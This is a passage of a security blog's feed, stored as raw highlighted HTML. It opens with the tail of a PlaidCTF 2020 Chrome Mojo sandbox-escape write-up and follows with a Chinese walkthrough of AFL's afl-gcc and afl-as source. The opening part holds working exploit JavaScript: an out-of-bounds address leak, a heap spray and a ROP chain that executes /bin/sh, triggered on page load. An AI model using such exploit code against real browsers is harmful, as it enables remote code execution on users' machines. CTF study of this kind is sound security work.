code_base+<span class="number">0x2ef528d</span>;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">'syscall: '</span>, syscall);</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">var</span> uaf_ab = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(kRenderFrameHost);</span><br><span class="line">        <span class="keyword">var</span> uaf_ta = <span class="keyword">new</span> BigUint64Array(uaf_ab);</span><br><span class="line">        uaf_ta[<span class="number">0</span>] = BigInt(iframe_render_frame_host_addr)+<span class="number">0x10n</span>;</span><br><span class="line">        uaf_ta[<span class="number">1</span>] = <span class="number">0n</span>;</span><br><span class="line">        uaf_ta[<span class="number">2</span>] = <span class="number">0n</span>; <span class="comment">//use by pop rbp</span></span><br><span class="line">        uaf_ta[<span class="number">3</span>] = BigInt(pop_rdi_ret);</span><br><span class="line">        uaf_ta[<span class="number">4</span>] = BigInt(iframe_render_frame_host_addr)+<span class="number">0x10n</span>+<span class="number">0x160n</span>+<span class="number">8n</span>;</span><br><span class="line">        uaf_ta[<span class="number">5</span>] = BigInt(pop_rsi_ret);</span><br><span class="line">        uaf_ta[<span class="number">6</span>] = BigInt(<span class="number">0</span>);</span><br><span class="line">        uaf_ta[<span class="number">7</span>] = BigInt(pop_rdx_ret);</span><br><span class="line">        uaf_ta[<span class="number">8</span>] = BigInt(<span class="number">0</span>);</span><br><span class="line">        uaf_ta[<span class="number">9</span>] = BigInt(pop_rax_ret);</span><br><span class="line">        uaf_ta[<span class="number">10</span>] = BigInt(<span class="number">59</span>);</span><br><span class="line">        uaf_ta[<span class="number">11</span>] = BigInt(syscall);</span><br><span class="line">        uaf_ta[(<span class="number">0x10</span>+<span class="number">0x160</span>)/<span class="number">8</span>] = BigInt(xchg);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">var</span> uaf_uint8 = <span class="keyword">new</span> <span class="built_in">Uint8Array</span>(uaf_ab); <span class="comment">// /bin/sh\x00</span></span><br><span class="line">        uaf_uint8[<span class="number">0x10</span>+<span class="number">0x160</span>+<span class="number">8</span>+<span class="number">0</span>] = <span class="number">0x2f</span>;</span><br><span class="line">        uaf_uint8[<span class="number">0x10</span>+<span class="number">0x160</span>+<span class="number">8</span>+<span class="number">1</span>] = <span class="number">0x62</span>;</span><br><span class="line">        uaf_uint8[<span class="number">0x10</span>+<span class="number">0x160</span>+<span class="number">8</span>+<span class="number">2</span>] = <span class="number">0x69</span>;</span><br><span class="line">        uaf_uint8[<span class="number">0x10</span>+<span class="number">0x160</span>+<span class="number">8</span>+<span class="number">3</span>] = <span class="number">0x6e</span>;</span><br><span class="line">        uaf_uint8[<span class="number">0x10</span>+<span class="number">0x160</span>+<span class="number">8</span>+<span class="number">4</span>] = <span class="number">0x2f</span>;</span><br><span class="line">        uaf_uint8[<span class="number">0x10</span>+<span class="number">0x160</span>+<span class="number">8</span>+<span class="number">5</span>] = <span class="number">0x73</span>;</span><br><span class="line">        uaf_uint8[<span class="number">0x10</span>+<span class="number">0x160</span>+<span class="number">8</span>+<span class="number">6</span>] = <span class="number">0x68</span>;</span><br><span class="line">        uaf_uint8[<span class="number">0x10</span>+<span class="number">0x160</span>+<span class="number">8</span>+<span class="number">7</span>] = <span class="number">0x00</span>;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">"heap spray"</span>);</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; try_size; i++)&#123; </span><br><span class="line">          <span class="comment">//await ptr.storeData('1', new Array(kRenderFrameHost).fill(0x32));</span></span><br><span class="line">          <span class="keyword">await</span> ptr.storeData(<span class="string">""</span>+i, <span class="keyword">new</span> <span class="built_in">Uint8Array</span>(uaf_ab));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">'getshell'</span>);</span><br><span class="line">        ptr.getData(<span class="string">"1"</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">async</span> <span class="function"><span class="keyword">function</span> <span class="title">oob</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">"oob"</span>);</span><br><span class="line">        <span class="keyword">var</span> ps_list = [];</span><br><span class="line">        <span class="keyword">var</span> try_size = <span class="number">100</span>;</span><br><span class="line">        <span class="keyword">var</span> vt_addr = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">var</span> render_frame_host_addr = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">var</span> code_base = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; try_size; i++)&#123;</span><br><span class="line">          <span class="keyword">var</span> pipe = Mojo.createMessagePipe();</span><br><span class="line">          Mojo.bindInterface(blink.mojom.PlaidStore.name,</span><br><span class="line">            pipe.handle1, <span class="string">"context"</span>, <span class="literal">true</span>);</span><br><span class="line">          <span class="keyword">var</span> tmp_ps_ptr = <span class="keyword">new</span> blink.mojom.PlaidStorePtr(pipe.handle0);</span><br><span class="line">          <span class="keyword">await</span> tmp_ps_ptr.storeData(<span class="string">"aaaa"</span>, <span class="keyword">new</span> <span class="built_in">Array</span>(<span class="number">0x30</span>).fill(<span class="number">0x31</span>))</span><br><span class="line">          ps_list.push(tmp_ps_ptr);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; try_size; i++)&#123;</span><br><span class="line">          <span class="keyword">if</span>(vt_addr != <span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">var</span> tmp_ps_ptr = ps_list[i];</span><br><span class="line">          <span class="keyword">let</span> r = <span class="keyword">await</span> tmp_ps_ptr.getData(<span class="string">"aaaa"</span>, <span class="number">0x100</span>);</span><br><span class="line">          <span class="keyword">let</span> oob_data = r.data;</span><br><span class="line">          <span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">0x30</span>; i &lt; <span class="number">0x100</span>; i = i + <span class="number">8</span>)&#123;</span><br><span class="line">            <span class="keyword">let</span> tmp_oob_data = b2i(oob_data.slice(i, i+<span class="number">8</span>));</span><br><span class="line">            <span class="keyword">if</span>(hex(tmp_oob_data &amp; <span class="number">0xfff</span>) == <span class="string">"0x7a0"</span>)&#123;</span><br><span class="line">                vt_addr = tmp_oob_data;</span><br><span class="line">                code_base = vt_addr - <span class="number">0x9fb67a0</span>;</span><br><span class="line">                <span class="built_in">console</span>.log(<span class="string">'vt_addr is: '</span>, hex(vt_addr));</span><br><span class="line">                <span class="built_in">console</span>.log(<span class="string">'code_base is: '</span>, hex(code_base));</span><br><span class="line">                render_frame_host_addr = b2i(oob_data.slice(i+<span class="number">8</span>, i+<span class="number">16</span>));</span><br><span class="line">                <span class="built_in">console</span>.log(<span class="string">'render_frame_host_addr is: '</span>, hex(render_frame_host_addr));</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        r2p_rfh(hex(render_frame_host_addr));</span><br><span class="line">        r2p_code_base(hex(code_base));</span><br><span class="line">      &#125;</span><br><span class="line">  &lt;<span class="regexp">/script&gt;</span></span><br><span class="line"><span class="regexp">  &lt;/</span>head&gt;</span><br><span class="line">  &lt;body onload=<span class="string">"trigger()"</span>&gt;&lt;<span class="regexp">/body&gt;</span></span><br><span class="line"><span class="regexp">&lt;/</span>html&gt;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;chrome-sandbox-escape-case-study-and-plaidctf2020-mojo-writeup&quot;&gt;&lt;a href=&quot;#chrome-sandbox-escape-case-study-and-plaidctf2020-mojo-wri
      
    
    </summary>
    
    
      <category term="浏览器" scheme="http://eternalsakura13.com/categories/%E6%B5%8F%E8%A7%88%E5%99%A8/"/>
    
    
      <category term="cpp" scheme="http://eternalsakura13.com/tags/cpp/"/>
    
  </entry>
  
  <entry>
    <title>sakuraのAFL源码全注释</title>
    <link href="http://eternalsakura13.com/2020/08/23/afl/"/>
    <id>http://eternalsakura13.com/2020/08/23/afl/</id>
    <published>2020-08-23T07:58:47.778Z</published>
    <updated>2020-08-23T08:02:47.279Z</updated>
    
    <content type="html"><![CDATA[<h2 id="afl-gcc小叙"><a href="#afl-gcc小叙" class="headerlink" title="afl-gcc小叙"></a>afl-gcc小叙</h2><h3 id="核心函数"><a href="#核心函数" class="headerlink" title="核心函数"></a>核心函数</h3><h4 id="find-as"><a href="#find-as" class="headerlink" title="find_as"></a>find_as</h4><p>这个函数用来寻找<code>afl-as</code>的位置。</p><ul><li>它首先检查是否存在AFL_PATH这个环境变量，如果存在就赋值给afl_path，然后检查<code>afl_path/as</code>这个文件是否可以访问，如果可以访问，就将afl_path设置为as_path。</li><li>如果不存在AFL_PATH这个环境变量，则检查argv0，例如（”/Users/sakura/gitsource/AFL/cmake-build-debug/afl-gcc”）中是否存在’/‘，如果有就找到最后一个’/‘所在的位置，并取其前面的字符串作为dir，然后检查<code>dir/afl-as</code>这个文件是否可以访问，如果可以访问，就将dir设置为as_path</li><li>如果上述两种方式都失败，则抛出异常。</li></ul><h4 id="edit-params"><a href="#edit-params" class="headerlink" title="edit_params"></a>edit_params</h4><p>这个函数主要是将argv拷贝到<code>u8 **cc_params</code>中，并做必要的编辑。</p><ul><li>它首先通过ck_alloc来为cc_params分配内存，分配的长度为<code>(argc+128)*8</code>，相当大的内存了。</li><li>然后检查argv[0]里有没有’/‘，如果没有就赋值’argv[0]’到name，如果有就找到最后一个’/‘所在的位置，然后跳过这个’/‘，将后面的字符串赋值给name。</li><li>将name和<code>afl-clang</code>比较<ul><li>如果相同，则设置clang_mode为1，然后设置环境变量CLANG_ENV_VAR为1。<ul><li>然后将name和<code>afl-clang++</code>比较<ul><li>如果相同，则获取环境变量<code>AFL_CXX</code>的值，如果该值存在，则将cc_params[0]设置为该值，如果不存在，就设置为clang++</li><li>如果不相同，则获取环境变量<code>AFL_CC</code>的值，如果该值存在，则将cc_params[0]设置为该值，如果不存在，就设置为clang</li></ul></li></ul></li><li>如果不相同，则将name和<code>afl-g++</code>比较<ul><li>如果相同，则获取环境变量<code>AFL_CXX</code>的值，如果该值存在，则将cc_params[0]设置为该值，如果不存在，就设置为g++</li><li>如果不相同，则获取环境变量<code>AFL_CC</code>的值，如果该值存在，则将cc_params[0]设置为该值，如果不存在，就设置为gcc</li></ul></li></ul></li><li>然后遍历从argv[1]开始的argv参数<ul><li>跳过<code>-B/integrated-as/-pipe</code></li><li>如果存在<code>-fsanitize=address</code>或者<code>-fsanitize=memory</code>，就设置asan_set为1;</li><li>如果存在<code>FORTIFY_SOURCE</code>，则设置fortify_set为1</li><li><code>cc_params[cc_par_cnt++] = cur</code>;</li></ul></li><li>然后开始设置其他的cc_params参数<ul><li>取之前计算出来的<code>as_path</code>，然后设置<code>-B as_path</code></li><li>如果是clang_mode,则设置<code>-no-integrated-as</code></li><li>如果存在AFL_HARDEN环境变量，则设置<code>-fstack-protector-all</code></li><li>sanitizer<ul><li>如果asan_set在上面被设置为1，则使<code>AFL_USE_ASAN</code>环境变量为1</li><li>如果存在AFL_USE_ASAN环境变量，则设置<code>-fsanitize=address</code></li><li>如果存在AFL_USE_MSAN环境变量，则设置<code>-fsanitize=memory</code>，但不能同时还指定<code>AFL_HARDEN</code>或者<code>AFL_USE_ASAN</code>，因为这样运行时速度过慢。</li></ul></li><li>如果不存在AFL_DONT_OPTIMIZE环境变量，则设置<code>-g -O3 -funroll-loops -D__AFL_COMPILER=1 -DFUZZING_BUILD_MODE_UNSAFE_FOR_PRODUCTION=1</code></li><li>如果存在AFL_NO_BUILTIN环境变量，则设置<code>-fno-builtin-strcmp</code>等</li></ul></li><li>最后<code>cc_params[cc_par_cnt] = NULL;</code>终止对cc_params的编辑</li></ul><h4 id="main函数"><a href="#main函数" class="headerlink" title="main函数"></a>main函数</h4><p>实际上看到这里，我们就知道afl-gcc就是找到as所在的位置，将其加入搜索路径，然后设置必要的gcc参数和一些宏，然后调用gcc进行实际的编译，仅仅只是一层wrapper</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Main entry point */</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (isatty(<span class="number">2</span>) &amp;&amp; !getenv(<span class="string">"AFL_QUIET"</span>)) &#123;</span><br><span class="line"></span><br><span class="line">        SAYF(cCYA <span class="string">"afl-cc "</span> cBRI VERSION cRST <span class="string">" by &lt;lcamtuf@google.com&gt;\n"</span>);</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">else</span> be_quiet = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (argc &lt; <span class="number">2</span>) &#123;</span><br><span class="line">        ...</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//查找fake GNU assembler</span></span><br><span class="line">    find_as(argv[<span class="number">0</span>]);</span><br><span class="line">    <span class="comment">// 设置CC的参数</span></span><br><span class="line">    edit_params(argc, argv);</span><br><span class="line">    <span class="comment">// 调用execvp来执行CC</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 这里我们在CC之前打印一下参数看看。</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="keyword">sizeof</span>(cc_params); i++) &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"\targ%d: %s\n"</span>,i,cc_params[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    execvp(cc_params[<span class="number">0</span>], (<span class="keyword">char</span> **) cc_params);</span><br><span class="line"></span><br><span class="line">    FATAL(<span class="string">"Oops, failed to execute '%s' - check your PATH"</span>, cc_params[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">sakura@sakuradeMacBook-Pro:~&#x2F;gitsource&#x2F;AFL&#x2F;cmake-build-debug$ .&#x2F;afl-gcc ..&#x2F;test-instr.c -o test</span><br><span class="line">afl-cc 2.57b by &lt;lcamtuf@google.com&gt;</span><br><span class="line">        arg0: gcc</span><br><span class="line">        arg1: ..&#x2F;test-instr.c</span><br><span class="line">        arg2: -o</span><br><span class="line">        arg3: test</span><br><span class="line">        arg4: -B</span><br><span class="line">        arg5: .</span><br><span class="line">        arg6: -g</span><br><span class="line">        arg7: -O3</span><br></pre></td></tr></table></figure><h2 id="afl-as小叙"><a href="#afl-as小叙" class="headerlink" title="afl-as小叙"></a>afl-as小叙</h2><h3 id="核心函数-1"><a href="#核心函数-1" class="headerlink" title="核心函数"></a>核心函数</h3><h4 id="edit-params-1"><a href="#edit-params-1" class="headerlink" title="edit_params"></a>edit_params</h4><p>检查并修改参数以传递给<code>as</code>。请注意，文件名始终是GCC传递的最后一个参数，因此我们利用这个特性使代码保持简单。<br><strong>主要是设置变量as_params的值，以及use_64bit/modified_file的值。</strong></p><ul><li>首先为as_params分配空间，大小为<code>(argc+32)*8</code></li><li><code>u8 *tmp_dir</code><ul><li>依次检查是否存在TMPDIR/TEMP/TMP环境变量，如果存在就设置，如果都不存在就设置tmp_dir为”/tmp”</li></ul></li><li><code>u8 *afl_as</code><ul><li>读取AFL_AS环境变量，如果存在就设置为afl_as的值</li><li>因为apple的一些原因，所以如果我们定义了<code>__APPLE__</code>宏，且当前是在clang_mode且没有设置AFL_AS环境变量，就设置use_clang_as为1，并设置afl_as为AFL_CC/AFL_CXX/clang中的一种。</li></ul></li><li>如果afl_as不为空，就设置<code>as_params[0]</code>为<code>afl_as</code>，否则设置为<code>as</code></li><li>设置<code>as_params[argc]</code>为0,as_par_cnt初始值为1。</li><li>然后遍历从argv[1]开始,到<code>argv[argc-1]</code>(也就是最后一个参数)之前的argv参数<ul><li>如果存在<code>--64</code>，设置use_64bit为1，如果存在<code>--32</code>，设置use_64bit为0;如果是apple,则如果存在<code>-arch x86_64</code>,设置use_64bit为1,并跳过<code>-q</code>和<code>-Q</code>选项</li><li><code>as_params[as_par_cnt++] = argv[i]</code>;设置as_params的值为argv对应的参数值</li></ul></li><li>然后开始设置其他的as_params参数<ul><li>如果use_clang_as为1，则设置<code>-c -x assembler</code>选项</li><li>读取<code>argv[argc - 1]</code>的值,赋给input_file的值,也就是传递的最后一个参数的值作为input_file</li><li>比较input_file和tmp_dir/<code>/var/tmp/</code>/<code>/tmp/</code>的前strlen(tmp_dir)/9/5个字节是否相同，如果不相同，就设置pass_thru为1</li><li>设置modified_file的值为<code>alloc_printf(&quot;%s/.afl-%u-%u.s&quot;, tmp_dir, getpid(),(u32) time(NULL));</code>,简单的说就是<code>tmp_dir/.afl-pid-time.s</code>这样的字符串。</li><li>设置<code>as_params[as_par_cnt++] = modified_file</code></li><li><code>as_params[as_par_cnt] = NULL;</code></li></ul></li></ul><h4 id="add-instrumentation"><a href="#add-instrumentation" class="headerlink" title="add_instrumentation"></a>add_instrumentation</h4><p>处理输入文件，生成modified_file，将instrumentation插入所有适当的位置。</p><ul><li>如果input_file不为空，则尝试打开这个文件，如果打开失败就抛出异常，如果为空，则读取标准输入，最终获取FILE* 指针inf</li><li>然后打开modified_file对应的临时文件，并获取其句柄outfd，再根据句柄通过fdopen函数拿到FILE*指针outf</li><li>通过fgets从inf中逐行读取内容保存到line数组里，每行最多读取的字节数是MAX_LINE(8192),这个值包括’\0’,所以实际读取的有内容的字节数是MAX_LINE-1个字节。从line数组里将读取的内容写入到outf对应的文件里。</li></ul><p><strong>接下来是真正有趣的部分，首先我们要确定的是，我们只在.text部分进行插桩，但因为这部分涉及到多平台以及优化后的汇编文件格式，这里我只会描述最核心的逻辑</strong></p><p>核心逻辑如下,我抽取了最重要的代码出来。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">  ^func:      - function entry point (always instrumented)</span><br><span class="line">  ^.L0:       - GCC branch label</span><br><span class="line">  ^.LBB0_0:   - clang branch label (but only in clang mode)</span><br><span class="line">  ^\tjnz foo  - conditional branches</span><br><span class="line"></span><br><span class="line">...but not:</span><br><span class="line"></span><br><span class="line">  ^# BB#0:    - clang comments</span><br><span class="line">  ^ # BB#0:   - ditto</span><br><span class="line">  ^.Ltmp0:    - clang non-branch labels</span><br><span class="line">  ^.LC0       - GCC non-branch labels</span><br><span class="line">  ^.LBB0_0:   - ditto (when in GCC mode)</span><br><span class="line">  ^\tjmp foo  - non-conditional jumps</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> (fgets(<span class="built_in">line</span>, MAX_LINE, inf)) &#123;</span><br><span class="line">    <span class="keyword">if</span>(instr_ok &amp;&amp; instrument_next &amp;&amp; <span class="built_in">line</span>[<span class="number">0</span>] == <span class="string">'\t'</span> &amp;&amp; <span class="built_in">isalpha</span>(<span class="built_in">line</span>[<span class="number">1</span>]))&#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(outf, use_64bit ? trampoline_fmt_64 : trampoline_fmt_32,</span><br><span class="line">                    R(MAP_SIZE));</span><br><span class="line"></span><br><span class="line">        instrument_next = <span class="number">0</span>;</span><br><span class="line">        ins_lines++;</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">line</span>[<span class="number">0</span>] == <span class="string">'\t'</span> &amp;&amp; <span class="built_in">line</span>[<span class="number">1</span>] == <span class="string">'.'</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">strncmp</span>(<span class="built_in">line</span> + <span class="number">2</span>, <span class="string">"text\n"</span>, <span class="number">5</span>) ||</span><br><span class="line">            !<span class="built_in">strncmp</span>(<span class="built_in">line</span> + <span class="number">2</span>, <span class="string">"section\t.text"</span>, <span class="number">13</span>) ||</span><br><span class="line">            !<span class="built_in">strncmp</span>(<span class="built_in">line</span> + <span class="number">2</span>, <span class="string">"section\t__TEXT,__text"</span>, <span class="number">21</span>) ||</span><br><span class="line">            !<span class="built_in">strncmp</span>(<span class="built_in">line</span> + <span class="number">2</span>, <span class="string">"section __TEXT,__text"</span>, <span class="number">21</span>)) &#123;</span><br><span class="line">            instr_ok = <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">strncmp</span>(<span class="built_in">line</span> + <span class="number">2</span>, <span class="string">"section\t"</span>, <span class="number">8</span>) ||</span><br><span class="line">            !<span class="built_in">strncmp</span>(<span class="built_in">line</span> + <span class="number">2</span>, <span class="string">"section "</span>, <span class="number">8</span>) ||</span><br><span class="line">            !<span class="built_in">strncmp</span>(<span class="built_in">line</span> + <span class="number">2</span>, <span class="string">"bss\n"</span>, <span class="number">4</span>) ||</span><br><span class="line">            !<span class="built_in">strncmp</span>(<span class="built_in">line</span> + <span class="number">2</span>, <span class="string">"data\n"</span>, <span class="number">5</span>)) &#123;</span><br><span class="line">            instr_ok = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">line</span>[<span class="number">0</span>] == <span class="string">'\t'</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">line</span>[<span class="number">1</span>] == <span class="string">'j'</span> &amp;&amp; <span class="built_in">line</span>[<span class="number">2</span>] != <span class="string">'m'</span> &amp;&amp; R(<span class="number">100</span>) &lt; inst_ratio) &#123;</span><br><span class="line">                <span class="built_in">fprintf</span>(outf, use_64bit ? trampoline_fmt_64 : trampoline_fmt_32,</span><br><span class="line">                        R(MAP_SIZE));</span><br><span class="line"></span><br><span class="line">                ins_lines++;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">strstr</span>(<span class="built_in">line</span>, <span class="string">":"</span>)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">line</span>[<span class="number">0</span>] == <span class="string">'.'</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> ((<span class="built_in">isdigit</span>(<span class="built_in">line</span>[<span class="number">2</span>]) || (clang_mode &amp;&amp; !<span class="built_in">strncmp</span>(<span class="built_in">line</span> + <span class="number">1</span>, <span class="string">"LBB"</span>, <span class="number">3</span>)))</span><br><span class="line">                        &amp;&amp; R(<span class="number">100</span>) &lt; inst_ratio) &#123;</span><br><span class="line">                            instrument_next = <span class="number">1</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">/* Function label (always instrumented, deferred mode). */</span></span><br><span class="line">            instrument_next = <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><p>检查<code>instr_ok &amp;&amp; instrument_next &amp;&amp; line[0] == &#39;\t&#39; &amp;&amp; isalpha(line[1])</code>即判断instrument_next和instr_ok是否都为1，以及line是否以<code>\t</code>开始，且<code>line[1]</code>是否是字母</p><ul><li>如果都满足，则设置<code>instrument_next = 0</code>,并向outf中写入<code>trampoline_fmt</code>，并将插桩计数器<code>ins_lines</code>加一。</li><li>这其实是因为我们想要插入instrumentation trampoline到所有的标签，宏，注释之后。</li></ul></li><li><p>首先要设置instr_ok的值，这个值其实是一个flag，只有这个值被设置为1，才代表我们在<code>.text</code>部分，否则就不在。于是如果instr_ok为1，就会在分支处执行插桩逻辑，否则就不插桩。</p><ul><li>如果line的值为<code>\t.[text\n|section\t.text|section\t__TEXT,__text|section __TEXT,__text]...</code>其中之一，则设置instr_ok为1，然后跳转到while循环首部，去读取下一行的数据到line数组里。</li><li>如果不是上面的几种情况，且line的值为<code>\t.[section\t|section |bss\n|data\n]...</code>，则设置instr_ok为0，并跳转到while循环首部，去读取下一行的数据到line数组里。</li></ul></li><li><p>插桩<code>^\tjnz foo</code>条件跳转指令</p><ul><li>如果line的值为<code>\tj[!m]...</code>,且<code>R(100) &lt; inst_ratio</code>，R(100)会返回一个100以内的随机数，inst_ratio是我们之前设置的插桩密度，默认为100，如果设置了asan之类的就会默认设置成30左右。</li><li><code>fprintf(outf, use_64bit ? trampoline_fmt_64 : trampoline_fmt_32, R(MAP_SIZE));</code>根据use_64bit来判断向outfd里写入trampoline_fmt_64还是trampoline_fmt_32。<ul><li><code>define R(x) (random() % (x))</code>，可以看到R(x)是创建的随机数除以x取余，所以可能产生碰撞</li><li>这里的R(x)实际上是用来区分每个桩的，也就是是一个标识。后文会再说明。</li></ul></li><li>将插桩计数器<code>ins_lines</code>加一。</li></ul></li><li><p>首先检查该行中是否存在<code>:</code>，然后检查是否以<code>.开始</code></p><ul><li>如果以<code>.</code>开始，则代表想要插桩<code>^.L0:</code>或者<code>^.LBB0_0:</code>这样的branch label，即style jump destination<ul><li>然后检查<code>line[2]</code>是否为数字 或者 如果是在clang_mode下，比较从line[1]开始的三个字节是否为LBB. 前述所得结果和<code>R(100) &lt; inst_ratio)</code>相与。<ul><li>如果结果为真，则设置<code>instrument_next = 1</code></li></ul></li></ul></li><li>否则代表这是一个function，插桩<code>^func:</code>function entry point<ul><li>直接设置<code>instrument_next = 1</code></li></ul></li></ul></li><li><p>如果插桩计数器ins_lines不为0，就在完全拷贝input_file之后，依据架构，像outf中写入main_payload_64或者main_payload_32，然后关闭这两个文件</p></li><li><p><strong>至此我们可以看出afl的插桩相当简单粗暴，就是通过汇编的前导命令来判断这是否是一个分支或者函数，然后插入instrumentation trampoline。</strong></p></li><li><p><strong>关于instrumentation trampoline，后文叙述</strong></p></li></ul><h4 id="main函数-1"><a href="#main函数-1" class="headerlink" title="main函数"></a>main函数</h4><p>最后我们回来看一下main函数</p><ul><li>读取环境变量AFL_INST_RATIO的值，设置为inst_ratio_str</li><li>设置srandom的随机种子为<code>rand_seed = tv.tv_sec ^ tv.tv_usec ^ getpid();</code></li><li>设置环境变量AS_LOOP_ENV_VAR的值为1</li><li>读取环境变量AFL_USE_ASAN和AFL_USE_MSAN的值，如果其中有一个为1，则设置sanitizer为1，且将inst_ratio除3。<ul><li>这是因为AFL无法在插桩的时候识别出ASAN specific branches，所以会插入很多无意义的桩，为了降低这种概率，粗暴的将整个插桩的概率都除以3</li></ul></li><li>edit_params(argc, argv)</li><li>add_instrumentation()</li><li>fork出一个子进程，让子进程来执行<code>execvp(as_params[0], (char **) 